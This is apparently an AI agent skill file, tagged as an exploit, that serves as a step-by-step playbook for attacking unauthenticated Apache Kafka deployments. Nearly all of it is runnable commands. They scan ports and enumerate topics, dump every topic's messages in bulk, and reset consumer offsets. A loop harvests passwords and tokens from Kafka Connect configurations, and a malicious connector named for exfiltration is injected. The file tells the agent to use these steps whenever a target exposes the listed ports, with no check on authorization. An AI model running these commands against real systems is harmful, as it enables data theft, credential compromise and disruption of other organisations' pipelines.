---
name: kafka-attack
description: "Apache Kafka unauthorized access and exploitation. Use when a target exposes port 9092, the Kafka Broker has no authentication, Schema Registry or Kafka Connect is exposed, or messages need to be stolen from Kafka. Covers unauthorized access, Topic enumeration and bulk message export, Consumer Group operations, Broker configuration theft, ACL manipulation, Schema Registry exploitation, Kafka Connect credential theft and malicious Connector injection, message tampering and data injection"
zh-signals: "Apache Kafka 未授权访问检测与消息窃取利用。信号:Kafka未授权,9092端口,Topic枚举,消息导出,Connect利用。"
when-to-use: "Use when a target exposes port 9092, 2181, 8081, or 8083, when a Kafka Broker appears to have no authentication, when Schema Registry or Kafka Connect is reachable, or when extracting messages and credentials from Kafka with kcat, kafka-topics.sh, and kafka-console-consumer.sh."
metadata:
  tags: "kafka,9092,zookeeper,2181,topic,consumer-group,schema-registry,kafka-connect,broker,acl,message queue"
  category: "exploit"
---

# Apache Kafka Unauthorized Access and Exploitation

Kafka has no authentication by default, and exposing any of the Broker (9092), ZooKeeper (2181), Schema Registry (8081), or Kafka Connect (8083) may lead to message theft, credential leaks, or even arbitrary command execution.

## Further Reading (Must Read)
- Full exploitation commands and payloads → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: Service Discovery and Version Identification

### 1.1 Port Scanning

```bash
# Default Kafka Broker port
nmap -sV -p 9092 TARGET

# Default ZooKeeper port
nmap -sV -p 2181 TARGET

# Schema Registry / Kafka Connect
nmap -sV -p 8081,8083 TARGET

# Scan the whole Kafka ecosystem port range
nmap -sV -p 2181,9092,9093,8081,8082,8083 TARGET
```

### 1.2 Broker Connectivity Test

```bash
# Obtain the Broker API versions (returned without authentication)
kafka-broker-api-versions.sh --bootstrap-server TARGET:9092

# kcat probe (a lightweight alternative)
kcat -b TARGET:9092 -L
```

**Key Decision**:
- A list of API versions is returned → no authentication, go directly to Phase 3
- Connection timeout / refused → the port is unreachable or network isolated
- An authentication error is returned → SASL is configured, credentials are required

---

## Phase 2: Unauthorized Access Detection

### 2.1 Topic List Test

```bash
# The fastest unauthorized access check — being able to list Topics means there is no authentication
kafka-topics.sh --list --bootstrap-server TARGET:9092

# kcat alternative
kcat -b TARGET:9092 -L | grep "topic"
```

### 2.2 ZooKeeper Unauthorized Access Test

```bash
# Four-letter command test (unauthenticated ZooKeeper)
echo ruok | nc TARGET 2181
# imok means unauthorized access

echo dump | nc TARGET 2181
echo envi | nc TARGET 2181
```

**Key Decision**:
- The Topic list succeeds → the Broker has no authentication, go to Phase 3
- ZooKeeper returns imok → ZooKeeper has no authentication, you can obtain cluster metadata through ZK
- Both fail → authentication may already be enabled, consider other entry points (Schema Registry / Kafka Connect)

---

## Phase 3: Attack Decision Tree

```
Does the Broker have no authentication?
├─ Yes → Topic enumeration + bulk message export (Phase 4)
│   ├─ Consumer Group privileges → offset reset + message replay
│   ├─ Broker configuration read privileges → configuration theft (including sensitive credentials)
│   └─ ACL management privileges → ACL tampering (privilege escalation / persistence)
├─ Schema Registry exposed (8081) → schema theft (data structure disclosure)
├─ Kafka Connect exposed (8083)
│   ├─ Connector configuration readable → credential theft (database passwords, etc.)
│   └─ Connector creatable → malicious Connector injection (data exfiltration / file write)
└─ ZooKeeper exposed (2181) → cluster metadata + Broker configuration
```

### Preliminary Information Gathering

```bash
# Cluster information overview (online brokers)
kcat -b TARGET:9092 -L

# Offline analysis of a KRaft metadata snapshot (requires an already obtained snapshot file)
kafka-metadata-shell.sh --snapshot /path/to/__cluster_metadata-0/00000000000000000000.log

# Broker configuration (may contain sensitive information)
kafka-configs.sh --bootstrap-server TARGET:9092 \
  --entity-type brokers --describe --all

# ACL list
kafka-acls.sh --bootstrap-server TARGET:9092 --list

# Consumer Group list
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 --list
```

---

## Phase 4: Message Theft Quick Reference

### 4.1 Topic Enumeration

```bash
# List all Topics
kafka-topics.sh --list --bootstrap-server TARGET:9092

# Topic details (partition count, replicas, ISR)
kafka-topics.sh --describe --bootstrap-server TARGET:9092

# Search for sensitive Topic names
kafka-topics.sh --list --bootstrap-server TARGET:9092 | \
  grep -iE "password|secret|credential|auth|token|user|order|payment|log"
```

### 4.2 Single Topic Message Export

```bash
# Consume the specified Topic from the beginning (limit the count to avoid overload)
kafka-console-consumer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME \
  --from-beginning \
  --max-messages 1000 > /tmp/kafka_topic_dump.txt

# Consume from a specific offset
kafka-console-consumer.sh \
  --bootstrap-server TARGET:9092 \
  --topic TOPIC_NAME \
  --partition 0 \
  --offset 100 \
  --max-messages 500
```

### 4.3 Bulk Export of All Topics

```bash
for topic in $(kafka-topics.sh --list --bootstrap-server TARGET:9092); do
  echo "=== Exporting: $topic ==="
  kafka-console-consumer.sh \
    --bootstrap-server TARGET:9092 \
    --topic "$topic" \
    --from-beginning \
    --max-messages 10000 > "/tmp/kafka_${topic}.txt" 2>/dev/null
done
```

### 4.4 Consumer Group Operations

```bash
# List all Consumer Groups
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 --list

# View Group details (current offset, lag)
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME --describe

# Reset the offset to the earliest (reconsume all messages)
kafka-consumer-groups.sh --bootstrap-server TARGET:9092 \
  --group GROUP_NAME \
  --topic TOPIC_NAME \
  --reset-offsets --to-earliest \
  --execute
```

→ Complete message theft and Consumer Group exploitation commands → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: Kafka Connect Exploitation Quick Reference

### 5.1 Connector Enumeration and Credential Theft

```bash
# List installed plugins
curl -s http://TARGET:8083/connector-plugins | jq .

# List all Connectors
curl -s http://TARGET:8083/connectors | jq .

# Obtain the Connector configuration (very likely to contain database credentials)
curl -s http://TARGET:8083/connectors/CONNECTOR_NAME/config | jq .

# Bulk extraction of sensitive configuration fields
for conn in $(curl -s http://TARGET:8083/connectors | jq -r '.[]'); do
  echo "=== $conn ==="
  curl -s "http://TARGET:8083/connectors/$conn/config" | \
    jq 'to_entries[] | select(.key | test("password|secret|token|credential|connection.url"; "i"))'
done
```

### 5.2 Malicious Connector Injection

```bash
# Use FileStreamSinkConnector to write Topic data to the target file system
curl -X POST http://TARGET:8083/connectors \
  -H "Content-Type: application/json" -d '{
    "name": "exfil-connector",
    "config": {
      "connector.class": "FileStreamSinkConnector",
      "tasks.max": "1",
      "file": "/tmp/exfiltrated-data.txt",
      "topics": "sensitive-topic"
    }
  }'
```

→ Complete Kafka Connect exploitation techniques → read [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 6: Schema Registry and ZooKeeper Exploitation Quick Reference

### 6.1 Schema Registry

```bash
# Obtain all Subjects
curl -s http://TARGET:8081/subjects | jq .

# Obtain Schema details (including field definitions, which may expose sensitive data structures)
curl -s http://TARGET:8081/subjects/TOPIC_NAME-value/versions/latest | jq .

# Search for sensitive field definitions
curl -s http://TARGET:8081/subjects/TOPIC_NAME-value/versions/latest | \
  jq -r '.schema' | grep -iE "password|secret|token|ssn|credit"
```

### 6.2 ZooKeeper Exploitation

```bash
# Connect with zkCli.sh
zkCli.sh -server TARGET:2181

# Enumerate the Kafka nodes (obtain the Broker list and Topic metadata)
# In zkCli.sh:
ls /brokers/ids
get /brokers/ids/0
ls /brokers/topics
get /config/brokers/0
```

---

## Tool Quick Reference

| Tool | Purpose |
|------|------|
| kafka-topics.sh | Topic enumeration and management |
| kafka-console-consumer.sh | Message consumption and export |
| kafka-console-producer.sh | Message production and injection |
| kafka-consumer-groups.sh | Consumer Group management and offset reset |
| kafka-configs.sh | Broker/Topic configuration reading |
| kafka-acls.sh | ACL listing and manipulation |
| kafka-broker-api-versions.sh | Broker version probing |
| kcat (kafkacat) | Lightweight Kafka client for enumeration/consumption/production |
| zkCli.sh | ZooKeeper client |
| curl / jq | Schema Registry and Kafka Connect REST API |

---

## Notes

- `--from-beginning` pulls the entire Topic history, and a large Topic may produce GB-scale data, so always combine it with `--max-messages` to limit the output
- Resetting a Consumer Group offset is a destructive operation and causes business consumers to reconsume messages
- Creating/deleting Connectors in Kafka Connect directly affects the data pipeline, assess the business impact before operating
- Schema Registry has no authentication by default, and modifying a Schema may cause deserialization failures on the consumer side
- ZooKeeper four-letter commands are disabled by default in newer versions (they require the `4lw.commands.whitelist` configuration)
- Message injection (Producer) may trigger anomalies in downstream business logic, proceed with caution
- Watch the disk space when bulk exporting Topics, it is recommended to check the message volume first with `kafka-topics.sh --describe`
